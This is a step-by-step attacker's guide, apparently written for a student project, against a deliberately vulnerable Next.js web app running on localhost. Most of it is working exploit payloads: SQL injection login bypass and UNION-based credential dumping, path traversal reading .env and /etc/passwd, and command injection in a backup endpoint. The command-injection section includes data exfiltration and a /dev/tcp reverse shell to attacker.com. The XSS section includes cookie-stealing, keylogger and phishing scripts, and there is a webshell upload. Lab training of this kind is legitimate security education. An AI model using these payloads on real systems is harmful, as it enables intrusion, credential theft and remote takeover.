# Complete Attack Enumeration Guide
## Step-by-Step Vulnerability Discovery & Exploitation

This document provides a realistic attacker's methodology for discovering and exploiting vulnerabilities.

---

## 🔍 Phase 1: Reconnaissance

### 1.1 Application Fingerprinting

```bash
# Check HTTP headers
curl -I http://localhost:3000

# Expected findings:
# - Framework: Next.js (from X-Powered-By or Server header)
# - Technology stack identified
```

**Attacker's Notes:**
- Application appears to be Next.js/React
- Likely has API routes under `/api/`
- May have server-side rendering

### 1.2 Directory Enumeration

```bash
# Common paths to test
/admin
/api
/login
/register
/products
/search
/cart
/checkout
/admin/home
/admin/tools
/admin/reviews
```

**Attacker's Notes:**
- Found admin panel at `/admin/home`
- Multiple API endpoints discovered
- Authentication required for admin access

### 1.3 API Endpoint Discovery

```bash
# Test common API endpoints
curl http://localhost:3000/api/products
curl http://localhost:3000/api/search
curl http://localhost:3000/api/login
curl http://localhost:3000/api/backup
curl http://localhost:3000/api/view-file
curl http://localhost:3000/api/products-search
curl http://localhost:3000/api/webshell
```

**Attacker's Notes:**
- Multiple API endpoints found
- Some require authentication
- Interesting endpoints: `/api/backup`, `/api/view-file`

---

## 🎯 Phase 2: Vulnerability Discovery

### Vulnerability 1: SQL Injection in Login

#### Discovery Process:

**Step 1: Identify Input Points**
```bash
# Found login form
POST /api/login
Body: {"username":"admin","password":"admin123"}
```

**Step 2: Test for SQL Injection**
```bash
# Test 1: Basic quote injection
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''","password":"test"}'

# Result: Check for SQL error messages
```

**Step 3: Confirm Vulnerability**
```bash
# Test 2: Authentication bypass
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"anything"}'

# If login succeeds → SQL injection confirmed!
```

**Attacker's Notes:**
- ✅ SQL injection confirmed
- Can bypass authentication
- Server logs show raw SQL query

#### Enumeration:

```bash
# Payload 1: Basic bypass
{"username":"admin'--","password":"anything"}

# Payload 2: OR condition
{"username":"admin' OR '1'='1","password":"anything"}

# Payload 3: Comment out password check
{"username":"admin'--","password":"anything"}

# Payload 4: Extract information (if UNION works)
{"username":"admin' UNION SELECT 1,2,3--","password":"anything"}
```

#### Exploitation:

```bash
# Step 1: Bypass authentication
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"test"}'

# Response contains session cookie
# Cookie: adminSession=admin:1234567890

# Step 2: Use session to access admin panel
curl http://localhost:3000/admin/home \
  -H "Cookie: adminSession=admin:1234567890"
```

**Impact:**
- ✅ Full admin access achieved
- Can now access all admin functions
- Can exploit other vulnerabilities requiring authentication

---

### Vulnerability 2: SQL Injection in Admin Search

#### Discovery Process:

**Step 1: Identify Input Points**
```bash
# Found in admin panel
GET /api/search?q=<term>&scope=users
```

**Step 2: Test for SQL Injection**
```bash
# Test 1: Basic injection
curl "http://localhost:3000/api/search?q=test' OR '1'='1&scope=users" \
  -H "Cookie: adminSession=admin:1234567890"

# Check if returns all users
```

**Step 3: Confirm Vulnerability**
```bash
# Test 2: Union-based injection
curl "http://localhost:3000/api/search?q=' UNION SELECT 1,2,3,4,5--&scope=users" \
  -H "Cookie: adminSession=admin:1234567890"

# If returns data → UNION injection works!
```

**Attacker's Notes:**
- ✅ SQL injection in search confirmed
- UNION SELECT works
- Can extract data from database

#### Enumeration:

```bash
# Step 1: Find column count
curl "http://localhost:3000/api/search?q=' UNION SELECT 1,2,3,4,5--&scope=users" \
  -H "Cookie: adminSession=admin:1234567890"

# Step 2: Identify displayed columns
# Check which numbers appear in response (those columns are displayed)

# Step 3: Extract database information
curl "http://localhost:3000/api/search?q=' UNION SELECT 1,VERSION(),3,4,5--&scope=users" \
  -H "Cookie: adminSession=admin:1234567890"

curl "http://localhost:3000/api/search?q=' UNION SELECT 1,USER(),3,4,5--&scope=users" \
  -H "Cookie: adminSession=admin:1234567890"

curl "http://localhost:3000/api/search?q=' UNION SELECT 1,DATABASE(),3,4,5--&scope=users" \
  -H "Cookie: adminSession=admin:1234567890"
```

#### Exploitation:

```bash
# Step 1: Extract table names
curl "http://localhost:3000/api/search?q=' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema=DATABASE()--&scope=users" \
  -H "Cookie: adminSession=admin:1234567890"

# Step 2: Extract column names
curl "http://localhost:3000/api/search?q=' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users'--&scope=users" \
  -H "Cookie: adminSession=admin:1234567890"

# Step 3: Extract user credentials
curl "http://localhost:3000/api/search?q=' UNION SELECT id,username,password,email,5 FROM users--&scope=users" \
  -H "Cookie: adminSession=admin:1234567890"

# Step 4: Extract all sensitive data
curl "http://localhost:3000/api/search?q=' UNION SELECT id,username,email,role,5 FROM users--&scope=users" \
  -H "Cookie: adminSession=admin:1234567890"
```

**Impact:**
- ✅ All user credentials extracted
- ✅ Database structure mapped
- ✅ Can access any table in database

---

### Vulnerability 3: Union-Based SQL Injection in Products Search

#### Discovery Process:

**Step 1: Identify Input Points**
```bash
# Found endpoint
GET /api/products-search?category=<term>
```

**Step 2: Test for SQL Injection**
```bash
# Test 1: Basic injection
curl "http://localhost:3000/api/products-search?category=' OR '1'='1"

# Check response for SQL query (if exposed)
```

**Step 3: Confirm Vulnerability**
```bash
# Test 2: Union injection
curl "http://localhost:3000/api/products-search?category=' UNION SELECT 1,2,3--"

# Response shows SQL query → vulnerability confirmed
```

**Attacker's Notes:**
- ✅ SQL injection confirmed
- SQL query visible in response (helpful for debugging)
- UNION SELECT works

#### Enumeration:

```bash
# Step 1: Find correct column count
# Test different counts until no error
curl "http://localhost:3000/api/products-search?category=' UNION SELECT 1,2,3--"
curl "http://localhost:3000/api/products-search?category=' UNION SELECT 1,2,3,4--"
# 3 columns work (id, name, price)

# Step 2: Identify which columns are displayed
# Column 2 (name) is displayed in results
```

#### Exploitation:

```bash
# Step 1: Extract database version
curl "http://localhost:3000/api/products-search?category=' UNION SELECT 1,VERSION(),3--"

# Step 2: Extract current user
curl "http://localhost:3000/api/products-search?category=' UNION SELECT 1,USER(),3--"

# Step 3: Extract database name
curl "http://localhost:3000/api/products-search?category=' UNION SELECT 1,DATABASE(),3--"

# Step 4: Extract table names
curl "http://localhost:3000/api/products-search?category=' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=DATABASE()--"

# Step 5: Extract column names from users table
curl "http://localhost:3000/api/products-search?category=' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--"

# Step 6: Extract user data
curl "http://localhost:3000/api/products-search?category=' UNION SELECT id,username,password FROM users--"

# Step 7: Find MySQL configuration path
curl "http://localhost:3000/api/products-search?category=' UNION SELECT 1,@@datadir,3--"
curl "http://localhost:3000/api/products-search?category=' UNION SELECT 1,@@basedir,3--"
curl "http://localhost:3000/api/products-search?category=' UNION SELECT 1,@@my.cnf,3--"
```

**Impact:**
- ✅ Database version identified
- ✅ Database user identified
- ✅ Configuration file paths found
- ✅ All user data extracted

---

### Vulnerability 4: Local File Inclusion (LFI)

#### Discovery Process:

**Step 1: Identify Input Points**
```bash
# Found endpoint
GET /api/view-file?file=<path>
```

**Step 2: Test for LFI**
```bash
# Test 1: Read known file
curl "http://localhost:3000/api/view-file?file=package.json"

# If successful → file reading works
```

**Step 3: Test Directory Traversal**
```bash
# Test 2: Directory traversal
curl "http://localhost:3000/api/view-file?file=../package.json"

# If successful → LFI confirmed!
```

**Attacker's Notes:**
- ✅ File reading works
- ✅ Directory traversal works
- Can read any accessible file

#### Enumeration:

```bash
# Step 1: Map directory structure
curl "http://localhost:3000/api/view-file?file=../package.json"
curl "http://localhost:3000/api/view-file?file=../../package.json"
curl "http://localhost:3000/api/view-file?file=../../../package.json"

# Step 2: Read application files
curl "http://localhost:3000/api/view-file?file=../lib/db.js"
curl "http://localhost:3000/api/view-file?file=../.env"
curl "http://localhost:3000/api/view-file?file=../pages/api/login.js"
```

#### Exploitation:

```bash
# Step 1: Extract database credentials
curl "http://localhost:3000/api/view-file?file=../.env"
# Look for: DB_HOST, DB_USER, DB_PASSWORD, DB_NAME

curl "http://localhost:3000/api/view-file?file=../lib/db.js"
# Check for hardcoded credentials

# Step 2: Read source code for more vulnerabilities
curl "http://localhost:3000/api/view-file?file=../pages/api/backup.js"
curl "http://localhost:3000/api/view-file?file=../pages/api/view-file.js"

# Step 3: Read system files (Linux)
curl "http://localhost:3000/api/view-file?file=../../etc/passwd"
curl "http://localhost:3000/api/view-file?file=../../etc/hosts"
curl "http://localhost:3000/api/view-file?file=../../etc/mysql/my.cnf"

# Step 4: Read system files (Windows)
curl "http://localhost:3000/api/view-file?file=..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts"
curl "http://localhost:3000/api/view-file?file=..\\..\\..\\ProgramData\\MySQL\\MySQL Server 8.0\\my.ini"
```

**Impact:**
- ✅ Database credentials extracted
- ✅ Source code analyzed
- ✅ System configuration accessed
- ✅ Can find more vulnerabilities in code

---

### Vulnerability 5: Command Injection in Backup

#### Discovery Process:

**Step 1: Identify Input Points**
```bash
# Found in admin panel
POST /api/backup
Body: {"filename":"site_data.tar"}
```

**Step 2: Test for Command Injection**
```bash
# Test 1: Command separator
curl -X POST http://localhost:3000/api/backup \
  -H "Content-Type: application/json" \
  -H "Cookie: adminSession=admin:1234567890" \
  -d '{"filename":"backup.tar; whoami"}'

# Check server logs for command execution
```

**Step 3: Confirm Vulnerability**
```bash
# Test 2: Multiple commands
curl -X POST http://localhost:3000/api/backup \
  -H "Content-Type: application/json" \
  -H "Cookie: adminSession=admin:1234567890" \
  -d '{"filename":"backup.tar; whoami; pwd; ls -la"}'

# If commands execute → command injection confirmed!
```

**Attacker's Notes:**
- ✅ Command injection confirmed
- Commands execute on server
- Output may not be visible (silent execution)

#### Enumeration:

```bash
# Test different command separators
# Semicolon
{"filename":"backup.tar; whoami"}

# Pipe
{"filename":"backup.tar | whoami"}

# Ampersand
{"filename":"backup.tar & whoami"}

# Newline (URL encoded)
{"filename":"backup.tar\nwhoami"}

# Command substitution
{"filename":"backup.tar$(whoami)"}
```

#### Exploitation:

```bash
# Step 1: System information
curl -X POST http://localhost:3000/api/backup \
  -H "Content-Type: application/json" \
  -H "Cookie: adminSession=admin:1234567890" \
  -d '{"filename":"backup.tar; whoami"}'

curl -X POST http://localhost:3000/api/backup \
  -H "Content-Type: application/json" \
  -H "Cookie: adminSession=admin:1234567890" \
  -d '{"filename":"backup.tar; uname -a"}'

# Step 2: Network information
curl -X POST http://localhost:3000/api/backup \
  -H "Content-Type: application/json" \
  -H "Cookie: adminSession=admin:1234567890" \
  -d '{"filename":"backup.tar; ifconfig"}'

# Step 3: File system access
curl -X POST http://localhost:3000/api/backup \
  -H "Content-Type: application/json" \
  -H "Cookie: adminSession=admin:1234567890" \
  -d '{"filename":"backup.tar; cat /etc/passwd"}'

# Step 4: Data exfiltration
curl -X POST http://localhost:3000/api/backup \
  -H "Content-Type: application/json" \
  -H "Cookie: adminSession=admin:1234567890" \
  -d '{"filename":"backup.tar; curl http://attacker.com/steal?data=$(cat /etc/passwd | base64)"}'

# Step 5: Reverse shell
curl -X POST http://localhost:3000/api/backup \
  -H "Content-Type: application/json" \
  -H "Cookie: adminSession=admin:1234567890" \
  -d '{"filename":"backup.tar; bash -i >& /dev/tcp/attacker.com/4444 0>&1"}'
```

**Impact:**
- ✅ Remote code execution achieved
- ✅ Full server control
- ✅ Can access all files and data
- ✅ Can establish persistent access

---

### Vulnerability 6: Cross-Site Scripting (XSS)

#### Discovery Process:

**Step 1: Identify Input Points**
```bash
# Found multiple input points:
# - Search: /search?q=<term>
# - Reviews: Comment field
# - Cart: Promo code
# - Home: Redirect parameter
```

**Step 2: Test for XSS**
```bash
# Test 1: Basic script tag
curl "http://localhost:3000/search?q=<script>alert('XSS')</script>"

# Check if script appears in response
```

**Step 3: Confirm Vulnerability**
```bash
# Test 2: In browser, check page source
# Look for unescaped user input
# Check for dangerouslySetInnerHTML
```

**Attacker's Notes:**
- ✅ XSS found in search page
- ✅ Stored XSS in reviews (requires flag)
- ✅ DOM XSS in cart (requires flag)

#### Enumeration:

```bash
# Test different payloads
# Script tag
/search?q=<script>alert('XSS')</script>

# Image with onerror
/search?q=<img src=x onerror=alert('XSS')>

# SVG with onload
/search?q=<svg onload=alert('XSS')>

# Iframe
/search?q=<iframe src=javascript:alert('XSS')></iframe>
```

#### Exploitation:

```bash
# Step 1: Cookie theft
/search?q=<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>

# Step 2: Keylogger
/search?q=<script>document.onkeypress=function(e){fetch('http://attacker.com/key?k='+e.key)}</script>

# Step 3: Load external script
/search?q=<script src="http://attacker.com/malicious.js"></script>

# Step 4: Phishing
/search?q=<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999"><div style="background:white;padding:20px;margin:20% auto;width:300px"><h2>Session Expired</h2><input type="password" id="pwd"><button onclick="fetch('http://attacker.com/phish?pwd='+document.getElementById('pwd').value)">Login</button></div></div>
```

**Impact:**
- ✅ Session hijacking
- ✅ Credential theft
- ✅ Malicious code execution
- ✅ User data exfiltration

---

### Vulnerability 7: Unrestricted File Upload

#### Discovery Process:

**Step 1: Identify Upload Functionality**
```bash
# Found in admin panel
POST /api/upload
Content-Type: multipart/form-data
Body: FormData with file
```

**Step 2: Test File Type Restrictions**
```bash
# Test 1: Upload image (should work)
curl -X POST http://localhost:3000/api/upload \
  -H "Cookie: adminSession=admin:1234567890" \
  -F "image=@test.jpg"

# Test 2: Upload JavaScript
curl -X POST http://localhost:3000/api/upload \
  -H "Cookie: adminSession=admin:1234567890" \
  -F "image=@malicious.js"

# If JS upload succeeds → vulnerability confirmed!
```

**Attacker's Notes:**
- ✅ File upload works
- ✅ JavaScript files accepted
- ✅ Files stored in public directory
- ✅ Files accessible via URL

#### Enumeration:

```bash
# Step 1: Test allowed file types
# - Images: JPG, PNG, GIF, WebP, SVG
# - JavaScript: .js
# - HTML: .html
# - Other: .css, .txt, .json, .pdf

# Step 2: Check file accessibility
curl http://localhost:3000/uploads/[uploaded-filename].js

# Step 3: Test execution
# Via XSS or direct script tag
```

#### Exploitation:

```bash
# Step 1: Upload malicious JavaScript
curl -X POST http://localhost:3000/api/upload \
  -H "Cookie: adminSession=admin:1234567890" \
  -F "image=@browser-shell.js"

# Response: {"success":true,"path":"/uploads/1234567890-abc123.js"}

# Step 2: Execute via XSS
/search?q=<script src="/uploads/1234567890-abc123.js"></script>

# Step 3: Upload webshell HTML
curl -X POST http://localhost:3000/api/upload \
  -H "Cookie: adminSession=admin:1234567890" \
  -F "image=@webshell.html"

# Step 4: Access webshell
curl http://localhost:3000/uploads/webshell.html
```

**Impact:**
- ✅ Malicious code uploaded
- ✅ Code executed in browser
- ✅ Persistent backdoor installed
- ✅ Can execute commands via webshell

---

## 🎯 Phase 3: Complete Attack Chain

### Full System Compromise Scenario

#### Step 1: Initial Access
```bash
# SQL Injection in login
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"test"}'

# Result: adminSession cookie obtained
```

#### Step 2: Privilege Escalation
```bash
# Access admin panel
curl http://localhost:3000/admin/home \
  -H "Cookie: adminSession=admin:1234567890"
```

#### Step 3: Information Gathering
```bash
# Extract database credentials via LFI
curl "http://localhost:3000/api/view-file?file=../.env" \
  -H "Cookie: adminSession=admin:1234567890"

# Extract all user data via SQL Injection
curl "http://localhost:3000/api/search?q=' UNION SELECT id,username,password,email,5 FROM users--&scope=users" \
  -H "Cookie: adminSession=admin:1234567890"
```

#### Step 4: Remote Code Execution
```bash
# Command injection via backup
curl -X POST http://localhost:3000/api/backup \
  -H "Content-Type: application/json" \
  -H "Cookie: adminSession=admin:1234567890" \
  -d '{"filename":"backup.tar; whoami; id; uname -a"}'
```

#### Step 5: Data Exfiltration
```bash
# Extract all sensitive data
curl "http://localhost:3000/api/products-search?category=' UNION SELECT id,username,password FROM users--"

# Read configuration files
curl "http://localhost:3000/api/view-file?file=../../etc/passwd" \
  -H "Cookie: adminSession=admin:1234567890"
```

#### Step 6: Persistence
```bash
# Upload webshell
curl -X POST http://localhost:3000/api/upload \
  -H "Cookie: adminSession=admin:1234567890" \
  -F "image=@webshell.html"

# Establish reverse shell
curl -X POST http://localhost:3000/api/backup \
  -H "Content-Type: application/json" \
  -H "Cookie: adminSession=admin:1234567890" \
  -d '{"filename":"backup.tar; bash -i >& /dev/tcp/attacker.com/4444 0>&1"}'
```

---

## 📊 Vulnerability Matrix

| # | Vulnerability | Discovery Method | Exploitation | Impact Level |
|---|--------------|-----------------|--------------|--------------|
| 1 | SQL Injection (Login) | Input fuzzing | Auth bypass | **Critical** |
| 2 | SQL Injection (Search) | Parameter testing | Data extraction | **High** |
| 3 | SQL Injection (Products) | UNION SELECT | DB enumeration | **High** |
| 4 | Local File Inclusion | Directory traversal | File reading | **High** |
| 5 | Command Injection | Command separator | RCE | **Critical** |
| 6 | XSS (Reflected) | Input reflection | Session hijack | **Medium** |
| 7 | XSS (Stored) | Review submission | Persistent attack | **High** |
| 8 | File Upload | File type testing | Code execution | **Critical** |

---

## 🔧 Testing Tools & Commands

### Manual Testing:
```bash
# cURL for HTTP requests
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test"}'

# Browser DevTools for XSS testing
# - Inspect Network tab
# - Check Console for errors
# - View Page Source
```

### Automated Tools:
```bash
# SQLMap for SQL injection
sqlmap -u "http://localhost:3000/api/login" \
  --data="username=test&password=test" \
  --method=POST \
  --batch

# Burp Suite for intercepting requests
# - Configure proxy
# - Intercept requests
# - Modify and replay
```

---

## 📝 Attack Report Template

### For Each Vulnerability:

**1. Discovery:**
- How was it found?
- What testing method?
- What indicated vulnerability?

**2. Enumeration:**
- What information was gathered?
- What payloads were tested?
- What worked?

**3. Exploitation:**
- Step-by-step exploitation
- Commands used
- Results obtained

**4. Impact:**
- What data was accessed?
- What systems were compromised?
- What could an attacker do?

**5. Evidence:**
- Screenshots
- Request/response logs
- Extracted data samples

---

This guide provides a complete attacker's methodology for your FYP! 🎯
